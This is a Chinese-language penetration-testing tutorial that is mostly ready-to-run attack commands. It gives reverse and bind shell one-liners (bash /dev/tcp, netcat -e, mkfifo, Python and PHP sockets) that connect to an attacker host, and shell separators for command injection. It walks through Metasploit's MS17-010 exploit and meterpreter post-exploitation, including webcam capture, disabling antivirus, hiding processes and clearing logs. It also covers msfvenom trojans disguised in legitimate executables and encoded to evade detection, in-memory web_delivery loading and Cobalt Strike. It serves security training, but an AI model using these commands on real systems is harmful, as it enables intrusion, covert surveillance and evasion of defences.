## 常见的入侵：正向shell连接和反弹shell、远程命令执行
正向shell连接：linux/x86/meterpreter/bind_tcp 目标主机开放端口并等待连接（攻击者 → 目标主动连接），适合目标有固定 IP 且端口可访问的场景，但可能被防火墙检测到异常开放的端口。
反弹shell：linux/x86/meterpreter/reverse_tcp 目标主机主动连接攻击者的监听端口（目标 → 攻击者主动连接），适合目标在 NAT 后或防火墙限制入站连接的场景，隐蔽性相对较高


### 正向shell连接
~~~shell
# 靶机开启cmd并且重定向到6666端口
nc -lvvp 6666 -e cmd.exe

# 控制端连接靶机6666端口获得shell
nc 192.168.1.62 6666
~~~

### 反弹shell
~~~shell
# 反弹shell案例
# 第一步：攻击机开启端口监听
# 先在你控制的攻击机上，用nc（netcat）工具监听一个端口（如 4444），等待目标机连接：
# 方法1：用nc监听（大部分Linux默认安装）
nc -lvp 4444  # -l：监听模式，-v：显示详细信息，-p：指定端口
# 方法2：若nc不支持-e参数，用bash监听（备选）
bash -i >& /dev/tcp/攻击机IP/4444 0>&1  # 这行是攻击机监听的备用写法，实际用nc更简单


# 第二步：靶机执行反弹 shell 命令，在靶机上执行以下命令，就会反弹shell给攻击机对应端口上的服务进行连接
# bash shell反弹
bash -i >& /dev/tcp/[攻击机的ip]/[攻击机的端口] 0>&1
# bash -i：生成交互式 shell
# >& /dev/tcp/攻击机IP/4444：将标准输出（stdout）和标准错误（stderr）重定向到攻击机的对应端口
# 0>&1：将标准输入（stdin）重定向到标准输出，实现双向交互（能输入命令、看输出）

# netcat 反弹（靶机需安装 nc）
# 方式1：nc支持-e参数（部分版本）
nc [攻击机IP] [攻击机的端口] -e /bin/bash  # -e：连接成功后执行bash
nc [攻击机IP] [攻击机的端口] -e cmd.exe  # -e：连接成功后执行cmd.exe
# 方式2：nc不支持-e参数（通用写法）
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [攻击机IP] [攻击机的端口] > /tmp/f

# python 反弹（靶机需安装 python）
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'
# 用 python 创建 socket 连接攻击机，重定向标准输入 / 输出 / 错误到 socket，执行 bash 交互

# php 反弹（靶机需有 php）
php -r '$sock=fsockopen("攻击机IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
~~~


## 远程命合注入执行攻击
其目标是通过易受攻击的应用程序在主机操作系统上执行任意命合。当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命合的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命合执行数中的参数时，将可注入恶意系统命分到正常命分中，造成命分执行攻击。一旦存在命合注入漏洞，攻击者就可以在目标系统执行任意命合。命令注入攻击常用在向程序传入不安全参数(命合行参数、http头、cookie)。命合执行继承Web Server用户的权限，一般都有权限写文件，写马、查看隐私信息、窃取源码甚至可以反弹shell，危害十分大。
~~~shell
可以使用以下方式直接添加其他命令进行注入攻击
# 在输入的参数中添加 ; 命令1 ; 命令2 从前向后依次执行命令，忽略前一个命令结果
# 在输入的参数中添加 \n 命令1 shell中换行本身就是命令分隔符，从前向后依次执行命令，忽略前一个命令结果
# 在输入的参数中添加 && 命令1 && 命令2 前一个命令成功（返回 0）才执行后一个命令
# 在输入的参数中添加 || 命令1 || 命令2 前一个命令执行失败（不返回 0）就执行后面的所有命令，如果前一个命令执行成功就不执行后面的所有命令
# 在输入的参数中添加 | 命令1 | 命令2 使用管道将前一个命令输出作为后一个命令输入
# 在输入的参数中添加 & 命令1 不阻塞当前终端让前一个命令在后台执行，同时执行后一个命令，如果不输入在&后面添加额外的命令，会在后台执行前面的命令然后终端可继续输入其他命令（本质是 “执行模式”，但常作为命令分隔使用）
# 在输入的参数中添加 ; (命令1 ; 命令2) 小括号内的多个命令会在一个子 shell 进程中执行，子 shell 的环境变化（如变量赋值、目录切换）不会影响当前 shell。括号内可用分号或换行符分隔命令
# 在输入的参数中添加 ; { 命令1 ; 命令2 } 花括号内命令在当前 shell 执行，环境变化（变量、目录）会影响当前 shell。语法要求：前面的花括号后必须有空格，后面的花括号前必须有分号或换行符
# 在输入的参数中添加 ; 命令1 <(命令2) 解释：命令 1 读取命令 2 的输出，把命令的输出伪装成一个临时文件（文件描述符），供需要 “读取文件” 的命令使用（常见于比较两个命令输出、批量处理等场景）
# 在输入的参数中添加 ; 命令1 >(命令2) 解释：命令 1 的输出写入 命令 2，把命令的输出伪装成一个临时文件（文件描述符），供需要 “读取文件” 的命令使用（常见于比较两个命令输出、批量处理等场景）
~~~



## Metasploit 检测利用漏洞攻击
The Metasploit Framework的简称。MSF高度模块化，即框架由多个module组成，是全球最受欢迎的工具。
metasploit是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新，涵盖了渗透测试中全过程，可以在这个框架下利Payload进行一系列的渗透测试。
~~~shell
kali-metasploit框架目录路径
/opt/metasploit-framework/embedded/framework/
/usr/share/metasploit-framework/

data：包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件
documentation：包含框架的可用文档
lib：metasploit的库文件夹
plugins：用来存放metasploit的插件
scripts：用来存放metasploit的脚本，包抵meterpreter及其它脚本
tools：存放多种的命令行实用程序
modules：存储metasploit的所有模块文件

modules下的目录
auxiliary：辅助模块，辅助渗透(端口扫描、登录密码爆破、漏洞验证等)
exploits：漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。命名规则操作系统/各种应用协议分类
payloads：攻击载荷，主要是攻击成功后在目标机器执行的代码，比如反弹shell的代码
post：后渗透阶段模块，漏洞利用成功获得meterpreter之后，向目标发送的一些功能性指令，如:提权等
encoders：编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统
evasion：躲避模块，用来生成免杀payload
nops：由于IDS/IPS会检查数据包中不规则的数据，在某些情况下，比如针对溢出攻击，某些特殊滑行字符串(NOPS x90x90...)则会因为被拦截而导致攻击失效  

# 初始化Metasploit的数据库
msfdb init

# 启动Metasploit进入交互式命令行
msfconsole

# 查看是否成功连接到数据库
db status

# 查看当前工作区
workspace

# 查看帮助
workspace -h

# Metasploit中使用nmap进行主机发现
db_nmap -PA -PS [host]
# -PA:TCP ACK PING扫描
# -PS:TCP SYN PING扫描
# -PR:ARP扫描是nmap对目标进行一个arpping扫描的过程，尤其在内网的情况下。因为防火墙不会禁止ARP请求。
# 基本上所有参数的使用都和nmap接近

# 进入指定模块，执行之后会在命令行提示符前面显示相关模块，例如执行下面的命令进入模块会命令行提示符前面会显示 (auxiliary)scanner/portscan/syn
use auxiliary/scanner/portscan/syn
# auxiliary/scanner/portscan/syn是tcp服务端口扫描模块
# auxiliary/scanner/netbios/nbname是Netbios协议探测扫描模块
# 如果不知道使用什么模块，就去上面的框架目录路径找相关模块下的目录，然后使用 search portscan 进行搜索目录可以获得相关描述信息

# 查看当前模块的参数描述信息以及当前的设置
show options

# 在当前模块下设置参数
set [参数] [参数值] 
# set rhost 192.168.0.134 设置目标主机地址
# 使用unset可以禁用参数

# 运行启动当前模块，以下两个命令都行
exploit
run

# 退出当前模块
back


# 案例：设置一台windows 7的靶机(目前公网上基本没有只有的机器，一些内网环境中可能存在)，基本包含ms17_010的漏洞，然后尝试攻击获得meterpreter
# 进入该漏洞扫描模块
use auxiliary/scanner/smb/smb_ms17_010
# 查看参数信息和进行设置参数
show options
set rhost 192.168.0.134 # 设置目标靶机地址
# 运行漏洞扫描
run 
# 如果存在ms17_010的漏洞，就进入该漏洞的利用模块
use exploit/windows/smb/ms17_010_psexec
# 查看参数信息和进行设置参数，该漏洞使用的是反弹Shell，在当前机器上监听一个端口，然后靶机发起请求到该端口，并将其命令行的输入输出转到当前机器
show options
set lhost 192.168.0.128  # 设置当前攻击机器的IP地址
set lport 4444           # 设置当前攻击机器启动监听的端口
set rhost 192.168.0.134  # 设置目标靶机地址
# 发起攻击，成功会进入meterpreter交互式命令行中（命令行提示变为meterpreter）或者直接进入shell
exploit

# meterpreter是metasploit的后渗透利用工具。基于内存dll注入实现，能够通过创建1个新进程并调用注入的dll来让目标系统运行注入的dll文件。在该模式下，攻击者与目标设备中Meterpreter的通信是通过stager套接字实现的。
# 查看攻击成功获得了通过meterpreter可以对靶机做啥
?
# 其中有对靶机执行核心命令、系统文件命令（新增、删除、修改、删除、下载、上传文件）、网络命令（代理设置、查看IP、开放端口、路由设置）、系统命令（清除后台数据、设置环境变量、杀死进程、关机、重启）、用户接口命令（监控鼠标键盘、摄像头打开关闭录制视频）、权限提升命令
# exit 关闭会话
# help 帮助信息
# sysinfo 系统平台信息
# shell 命令行shell(exit退出)
# getlwd 查看本地目录
# lcd 切换本地目录
# getwd 查看目录
# ls 查看文件目录列表
# cd 切换目录
# rm 删除文件
# search 搜索文件，案例：search -d c:-f*.doc 
# screenshot 屏幕截取
# webcam list 查看摄像头
# webcam snap 通过摄像头拍照
# webcam stream 通过摄像头开启视频
# execute -H -i -f cmd.exe 进入靶机的cmd.exe ，-H不可见，-i交互
# upload 上传文件，案例：upload /xxx.exe C:\\windows\\system32
# download 下载文件，案例：C:\\1.txt 1.txt 
# ps 查看进程
# getuid 查看当前用户权限
# getpid 查看当前木马进程pid
# run killav 关闭杀毒软件，实际上基本上所有的杀毒软件都无法关闭，即使是windows自带默认的杀毒软件都无法关闭
# run getgui-e 启用远程桌面
# migrate 迁移当前木马进程到其他正常的进程中并行运行，这样在任务管理器中无法看到木马程序了
# clearev 清除入侵痕迹

# 查看当前木马进程ID和其他进程，迁移木马进程到其他进程，注意只能由高权限进程迁移到同一权限或者低权限进程（直接迁移到同一用户下的其他进程）
getpid
ps
migrate [目标进程]


# 保存meterpreter为session并退出
background

# 查看的session列表
sessions

# 再次进入meterpreter
sessions [sessions id]

# 将某个session shell转为meterpreter，有可能失败
sessions -u [session id]

~~~

## msfvenom 木马生成介绍 
msfvenom是msfpayload和msfencode的组合。将这两个工具集成在一个框架实例中。
msfvenom是用来生成后门木马的软件，在目标机上执行后门木马，在本地监听
~~~shell
# 生成木马
msfvenom
# -p或--payload参数，指定特定的 Payload，如果被设置为-，那么从标准输入流中读取。几乎支持全平台。
# -1或--list参数，列出所有可用的项目，其中值可以被设置为 payloads,encoders,nops, all
# -n或--nopsled参数，指定 nop 在 payload 中的数量
# -f或--format参数，指定 Payload 的输出格式(--list formats:列出所有可用的输出格式)
# -e或--encoder参数，指定用于加密 / 混淆 payload 的编码器，原始 payload 有固定的字节特征（易被 AV 识别），编码器会对其进行加密或混淆处理，生成一段 “变形” 后的代码。当 payload 在目标机器上执行时，会先通过内置的解码器还原出原始 payload 再运行，x86/shikata_ga_nai是 Metasploit 中最常用的编码器之一，支持 32 位 x86 架构，采用多态加密（每次编码结果不同），抗检测能力较强，但对 64 位程序兼容性较差
# -a或--arch参数，指定目标系统架构
# -s或--space参数，设置未经编码的 Payload 的最大长度(--encoder-space:编码后的 Payload 的最大长度)
# -b或--bad-chars参数，设置需要在 Payload 中避免出现的字符，例如:’\0f''\x00'等
# -i或--iterations参数，设置 Payload 的编码次数
# -o或--out参数，保存 Payload 到文件
# -c或--add-code参数，指定一个附加的win32 shellcode文件
# -x或--template参数，指定一个特定的可执行文件作为模板进行伪装，使其生成的木马具备一样的图标、大小和部分行为，主要用于规避杀毒软件（AV）检测（通过 “伪装” 成正常程序）和降低目标警惕性（用户看到熟悉的程序图标 / 名称可能更易执行）
# -k或--keep参数，保护模板程序的功能，注入的payload作为一个新的进程运行
# --platform参数:指定目标系统平台
# --smallest参数:尽可能生成最短的 Payload

# 生成适用于靶机是Linux系统的反弹shell的木马，elf文件是用于存储可执行程序、共享库（.so）、目标文件（.o）等，是 Linux 平台的标准二进制格式
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[你的ip地址] LPORT=[你监听的端口] -f elf > shell.elf
x
# 生成适用于靶机是Linux系统的正向shell连接的木马
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=[靶机开放的端口，等待攻击者的连接] -f elf > shell.elf

# 生成适用于靶机是Windows系统的反弹shell的木马
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[你的ip地址] LPORT=[你监听的端口] -f exe > shell.exe

# 生成适用于靶机是Mac系统的反弹shell的木马
msfvenom -p osx/x86/shell_reverse_tcp LHOST=[你的ip地址] LPORT=[你监听的端口] -f macho > shell.macho

# 生成适用于靶机是Windows系统的反弹shell的木马，使用-x指定的模板文件将恶意代码嵌入正常程序，用于伪装和初步免杀，-e指定的编码器（如 x86/shikata_ga_nai），对 payload 进行加密混淆，进一步规避检测
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[你的ip地址] LPORT=[你监听的端口] -x /root/Desktop/StampRemover.exe -e x86/shikata_ga_nai -f exe -o /var/www/html/heelllo.exe

# 针对web运行环境的反弹shell木马生成，如下是php、asp、jsp、war木马脚本的生成，通过上传脚本然后在网页上访问这个脚本的链接可以在服务器中启动脚本
msfvenom -p php/meterpreter/reverse_tcp LHOST=[你的ip地址] LPORT=[你监听的端口] -f raw > shell.php
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=[你的ip地址] LPORT=[你监听的端口] -f aspx -o shell.aspx
msfvenom -p java/jsp_shell _reverse_tcp LHOST=[你的ip地址] LPORT=[你监听的端口] -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[你的ip地址] LPORT=[你监听的端口] -f war > shell.war

# 一些脚本环境的反弹shell木马生成，如下是python、bash、perl脚本环境的木马脚本生成
msfvenom -p python/meterpreter/reverse_tcp LHOST=[你的ip地址] LPORT=[你监听的端口] -f war > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST=[你的ip地址] LPORT=[你监听的端口] -f war > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST=[你的ip地址] LPORT=[你监听的端口] -f war > shell.pl

# 查找合适的payload生成木马
msfvenom -l payloads | grep 'windows' | awk '{print $l}'
# payload分为staged和stageless:
# Staged payload: <platform>/[arch]/<stage>/<stager>
# Stageless payload: <platform>/[arch]/<single>
# Stageless Meterpreter是一个二进制文件，包含Meterpreter的所有必需部分以及所有必需的扩展，全部捆绑在一起，将完整的payload都编译在木马中，体积庞大容易被检测到，但是功能齐全
# Staged Meterpreter负责建立目标用户与攻击者之间的网络连接，将执行传递到另一个阶段，如:reverse tcp、 bind tcp，体积小隐蔽性高，但是只会构建连接功能不全网络不稳定容易断开

# Payload            Staged                                     Stageless
# Reverse TCP        windows/meterpreter/reverse_tcp            windows/meterpreter_reverse_tcp
# Reverse HTTPS      windows/meterpreter/reverse_https          windows/meterpreter_reverse_https
# Bind TCP           windows/meterpreter/bind_tcp               windows/meterpreter_bind_tcp
# Reverse TCP IPv6   windows/meterpreter/reverse_ipv6_tcp       windows/meterpreter_reverse_ipv6_tcp


# 案例：以 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[你的ip地址] LPORT=[你监听的端口] -f exe > shell.exe 生成的反弹shell木马为例
# 首先需要目标靶机执行上述木马（通过一些方式上传木马，然后再通过一些方式让它启动，例如远程命令执行漏洞）
# 启动Metasploit进入交互式命令行
msfconsole

# 进入指定exploit/multi/handler模块，Metasploit的exploit/multi/handler模块是一个有效负载处理程序，它只处理在受损主机中执行的有效负载连接
use exploit/multi/handler

# 设置当前模块的payload参数
set payload windows/meterpreter/reverse_tcp
# 查看当前模块的参数描述信息以及当前的设置
show options
# 设置当前模块的lhost和lport参数
set lhost 192.168.0.128  # 设置当前攻击机器的IP地址
set lport 4444           # 设置当前攻击机器启动监听的端口

advanced

# 经常遇到假session或者刚连接就断开，可以在接收到session后，继续监听端口，保持job存活
set ExitOnsession false


# 默认情况下，如果一个会话将在5分钟(300秒)没有任何活动，那么它会被杀死，为防止此情况可将此项修改为0
set SessioncommunicationTimeout 0

# 默认情况下，一个星期(604800秒)后，会话将被强制关闭，修改为0可永久不会被关闭
set SessionExpirationTimeout 0

# exploit启动当前模块获取meterpreter，-j参数设置在后台监听端口，-z参数设置成功后不主动发送stage，(通过jobs可以查看运行的任务，jobs -K结束所有任务) 或者run运行模块
exploit -j -z
run

# 快捷建立监听的方式
handler -H 192.168.24.146 -P 5449 -p windows/meterpreter/reverse tcp

~~~

## web delivery生成连接
当攻击者拥有部分受害者主机的控制权，但还没有拿到一个完整的shell时，web_delivery就派上用场。
web delivery的主要目的是快速和受害者主机建立一条session。当受害者主机存在比如命令注入、远程命令执行等问题时，攻击者可以使用web delivery生成的一条命令建立连接。
另外web delivery的payload不会在受害者主机磁盘上写文件，而是直接将攻击者服务器上的代码加载到内存执行，有利于绕过检测。
web_delivery支持php/python/powershell等多种脚本，使用不同的脚本的payload
~~~shell
# 启动Metasploit进入交互式命令行
msfconsole

# 进入指定exploit/multi/script/web_delivery模块
use exploit/multi/script/web_delivery

# 设置 php 的payload
set payload php/meterpreter/reverse_tcp

# 设置当前模块的lhost和lport参数
set lhost 192.168.0.128  # 设置当前攻击机器的IP地址
set lport 4444           # 设置当前攻击机器启动监听的端口

# 查看当前模块的参数描述信息以及当前的设置
show options

# 查看不同的target类型脚本ID
show target

# 设置target类型脚本ID，既然上述使用的是php的payload，那这里也需要使用php的target类型脚本ID
set target [脚本ID]

# 生成php脚本命令，直接复制到靶机上运行php脚本命令或者通过其他方式注入php脚本进行运行，当前前提是靶机上必须要有php的环境，如果不行就要尝试更换其他的脚本类型
# 例如切换到windows的powershell脚本执行，当前所有的杀毒软件都会拦截powershell脚本执行
run
~~~

## Cobalt Strike 使用
cobalt strike(简称CS)是一款团队作战渗透测试神器，分为客户端及服务端，一个服务端可以对应多个客户端，一个客户端可以连接多个服务端。
Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。
armitage是metasploit框架的图形化界面方式，Cobalt Strike是armitage的增强版，同时也是收费软件。cobalt strike在2.0版本还是依托metasploit版本使用单独的平台。之后的版本是独立的平台

安装使用参考：https://blog.csdn.net/weixin_44268918/article/details/128857998

